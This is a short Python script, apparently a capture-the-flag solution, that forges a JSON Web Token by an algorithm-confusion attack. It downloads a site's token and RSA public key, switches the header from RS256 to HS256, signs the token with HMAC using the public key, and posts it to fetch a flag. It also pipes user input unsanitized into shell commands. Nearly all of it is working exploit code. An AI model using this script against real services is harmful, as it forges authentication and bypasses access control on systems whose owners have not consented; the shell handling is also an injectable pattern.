#! /bin/python3

import urllib.request
import os, sys
import subprocess
from base64 import b64encode, b64decode



directory = os.getcwd()

#Grab JWT token from Web
Addr = input("Address for JWT...  ")
os.system(f"curl http://{Addr} | grep 'JWT: ' > token.txt")
token = open(f"{directory}/token.txt").read()
token = token.split()[1]

#Grab Public Key and convert to Hex
try:
    with urllib.request.urlopen(f"http://{Addr}/public.pem") as f:
        public_key = f.read().decode()
        file = open(f"{directory}/pub_key.txt", "w").write(public_key)
        
except:
    print("Something went wrong with the public key address")

with open(f'{directory}/pub_key.txt', 'rb') as f:
    hex_key = f.read().hex()

# Edit Header to Replace Algo     
token = open(f"{directory}/token.txt").read()
token = token.split()[1]
x = token.split(".") 
header = x[0]
payload = x[1]
secret = x[2]

algo_replace = b64decode(header).replace(b'RS256', b'HS256')
new_header = b64encode(algo_replace).decode("utf-8")

#Sign as Valid HS256 Key
result = subprocess.check_output([f"echo -n '{new_header}.{payload}' | openssl dgst -sha256 -mac HMAC -macopt hexkey:{hex_key}"], shell=True)
Valid_HS256 = str(result)[11:-3]


#Decode HS256 hex to binary data, and reencode it in base64
Secret_Key = b64encode(bytes.fromhex(Valid_HS256)).decode()


#Recompile token
JWT_Token = f"{new_header}.{payload}.{Secret_Key}"
#print(JWT_Token)

#Post and Recieve Flag
os.system(f"curl -s -X POST -F 'jwt={JWT_Token}' http://{Addr} | sed 's/<.*>//g'")

#cleanup
os.system("rm pub_key.txt token.txt")
